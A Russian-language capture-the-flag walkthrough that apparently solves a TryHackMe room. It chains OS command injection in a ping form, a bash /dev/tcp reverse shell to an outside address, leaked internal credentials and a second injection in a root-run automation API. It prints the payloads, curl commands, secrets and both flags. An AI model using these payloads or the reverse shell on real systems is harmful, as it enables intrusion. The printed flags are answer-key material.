**Теги:** Web. Boot2Root.
**Сложность:** Medium.

## 1. Разведка

Цель комнаты — получить **user и root flag**, то есть полностью скомпрометировать систему.

Target:

```text
10.112.179.167
```

Начинаем со стандартного сканирования:

```bash
sudo nmap -sV -sC -O 10.112.179.167
```

Получаем:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 07:12 EDT
Nmap scan report for 10.112.179.167
Host is up (0.089s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 bd:99:b4:3a:97:32:e7:93:d7:ee:7d:ff:d3:a9:e3:61 (ECDSA)
|_  256 f1:e0:08:54:da:16:18:88:9c:19:a1:8e:fa:c5:38:cf (ED25519)
80/tcp open  http    Gunicorn
| http-robots.txt: 2 disallowed entries
|_/internal/ /status
|_http-server-header: gunicorn
|_http-title: Byte Lotus — Stay Noticed
```

Открыты:

```text
22/tcp — SSH
80/tcp — HTTP (Gunicorn)
```

Особенно интересен `robots.txt`, поскольку он раскрывает два запрещённых пути:

```text
/internal/
/status
```

---

# 2. robots.txt

Проверяем:

```text
http://10.112.179.167/robots.txt
```

Содержимое:

```text
User-agent: *
Disallow: /internal/
Disallow: /status
```

Переходим к `/status`:

```text
http://10.112.179.167/status
```

На странице обнаруживается форма **Staff tools → Sister-property connectivity**, которая позволяет указать host для проверки доступности удалённого объекта.

Это выглядит как потенциальная точка входа, поскольку сервер должен каким-то образом обработать введённое значение.

---

# 3. Проверка команды ping

Сначала проверяем обычное значение:

```text
127.0.0.1
```

Сервер возвращает результат:

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
```

Следовательно, backend действительно выполняет системную команду `ping`.

---

# 4. Обнаружение Command Injection

Проверяем, как приложение обрабатывает специальные символы.

Вводим:

```text
'
```

Получаем:

```text
/bin/sh: 1: Syntax error: Unterminated quoted string
```

Это важный признак: введённое значение попадает непосредственно в shell-команду.

Проверяем command substitution:

```text
host=$(id)
```

Получаем:

```text
ping: groups=1001(web): Name or service not know
```

Это подтверждает выполнение команды `id`.

Таким образом, `/status` содержит **OS Command Injection**.

---

# 5. Получение user flag

После подтверждения command injection пробуем прочитать файл пользователя:

```text
host=$(cat /home/web/user.txt)
```

Сервер возвращает:

```text
ping: THM{n0_v1s1bl3_3dg3}: Name or service not known
```

Таким образом, первый флаг:

```text
THM{n0_v1s1bl3_3dg3}
```

---

# 6. Получение reverse shell

Для полноценного доступа к системе используем command injection для запуска reverse shell:

```text
$(bash -c 'bash -i >& /dev/tcp/192.168.154.82/4444 0>&1')
```

После отправки payload получаем оболочку на машине:

```text
web@tryhackme-2404:/var/www/infinity_pool/edge$
```

Проверяем содержимое текущей директории:

```bash
ls -la
```

Получаем:

```text
total 32
drwxr-xr-x 5 root root 4096 Jun 30 09:33 .
drwxr-xr-x 5 root root 4096 Jun 30 09:35 ..
-rw-r--r-- 1 root root 1070 Jun 30 09:22 app.py
-rw-r--r-- 1 root root   30 Jun 29 10:14 requirements.txt
drwxr-xr-x 2 root root 4096 Jun 29 10:14 static
drwxr-xr-x 2 root root 4096 Jun 29 10:14 templates
drwxr-xr-x 5 root root 4096 Jun 30 09:06 venv
-rw-r--r-- 1 root root   34 Jun 29 10:14 wsgi.py
```

Текущий пользователь:

```text
web
```

---

# 7. Поиск пути к root

После получения shell запускаем LinPEAS для поиска возможностей повышения привилегий.

В результате обнаруживаем systemd-сервис:

```text
/etc/systemd/system/cc-automation.service
```

Смотрим его содержимое:

```bash
cat /etc/systemd/system/cc-automation.service
```

Получаем:

```text
[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn \
    --workers 1 \
    --bind 127.0.0.1:9000 \
    wsgi:app
```

Ключевой момент:

```text
User=root
Group=root
```

Automation service работает от имени `root`.

При этом сервис слушает только localhost:

```text
127.0.0.1:9000
```

---

# 8. Исследование automation API

Проверяем health endpoint:

```bash
curl -sS http://127.0.0.1:9000/health
```

Получаем:

```json
{
    "endpoints": {
        "GET /health": "service status",
        "POST /jobs/export": {
            "auth": "Authorization: Bearer <automation key>",
            "body": {
                "report": "<report name>"
            },
            "desc": "archive the latest data export"
        }
    },
    "runs_as": "root",
    "service": "automation",
    "status": "ok"
}
```

Здесь обнаруживается интересный endpoint:

```text
POST /jobs/export
```

Для него требуется:

```text
Authorization: Bearer <automation key>
```

А сам сервис выполняется от `root`.

---

# 9. Получение конфигурации

Далее проверяем ещё один локальный API:

```bash
curl -sS http://127.0.0.1:3000/api/config
```

Получаем:

```json
{
    "automation_endpoint": "http://127.0.0.1:9000",
    "note": "internal network only -- do not expose",
    "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
    "telephony_pass": "St4yN0t1c3d_2026",
    "telephony_portal": "http://127.0.0.1:8080/ucp",
    "telephony_user": "FreePBXUCPTemplateCreator"
}
```

Таким образом, конфигурация раскрывает:

```text
Automation endpoint:
http://127.0.0.1:9000

Telephony portal:
http://127.0.0.1:8080/ucp

Username:
FreePBXUCPTemplateCreator

Password:
St4yN0t1c3d_2026
```

---

# 10. Telephony credentials

Из конфигурации получаем:

```text
Username: FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026
```

 Отметим также:

```text
FreePBX CVE-2026-46376
```

Для доступа к внутреннему telephony portal использовался SSH-туннель:

```bash
ssh -o IdentitiesOnly=yes -i infinity -L 8080:127.0.0.1:8080 web@10.113.184.19
```

Также находим automation key:

```text
Automation Key: cc_auto_7b3f9a1c4e0d2f6a
```

---

# 11. Command Injection в `/jobs/export`

Теперь у нас есть всё необходимое для обращения к внутреннему automation API:

```text
Endpoint:
http://127.0.0.1:9000/jobs/export

Authorization:
Bearer cc_auto_7b3f9a1c4e0d2f6a
```

Сначала проверяем параметр `report` командой `id`:

```bash
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"test;id;#"}'
```

Используем:

```text
test;id;#
```

как значение `report`, чтобы проверить возможность внедрения команды.

Поскольку automation service работает от имени `root`, успешное выполнение `id` должно показать root-контекст.

---

# 12. Получение root flag

После подтверждения command injection используем тот же endpoint для чтения root flag:

```bash
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"x;cat /root/root.txt;#"}'
```

Payload:

```text
x;cat /root/root.txt;#
```

позволяет выполнить:

```bash
cat /root/root.txt
```

в контексте root-сервиса.

Получаем root flag:

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

---

# Итоговая цепочка

```text
Nmap
  │
  ├── 22/tcp SSH
  │
  └── 80/tcp HTTP
          │
          ▼
      /robots.txt
          │
          ▼
       /status
          │
          ▼
   ping functionality
          │
          ▼
   Command Injection
          │
          ├── $(id)
          │
          ├── $(cat /home/web/user.txt)
          │
          │       ▼
          │   User flag
          │
          └── Reverse shell
                  │
                  ▼
             user: web
                  │
                  ▼
               LinPEAS
                  │
                  ▼
       cc-automation.service
                  │
                  ▼
          service runs as root
                  │
                  ▼
      http://127.0.0.1:9000
                  │
                  ▼
          /jobs/export
                  │
                  ▼
          Automation Key
                  │
                  ▼
       Command Injection
                  │
                  ▼
          cat /root/root.txt
                  │
                  ▼
               Root flag
```

## User flag

```text
THM{n0_v1s1bl3_3dg3}
```

## Root flag

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

## Уязвимости

Основная цепочка эксплуатации состоит из двух command injection.

Первая находится в `/status`: введённый `host` попадает в shell-команду `ping`, что позволяет выполнять произвольные команды от имени пользователя `web`.

Вторая находится во внутреннем automation API `/jobs/export`. Сервис запущен с:

```text
User=root
Group=root
```

а параметр `report` позволяет внедрить команды. Благодаря этому выполнение:

```text
cat /root/root.txt
```

происходит с root-привилегиями.

Таким образом, цепочка выглядит как:

```text
Command Injection → web shell → enumeration → root service → Command Injection → root flag
```
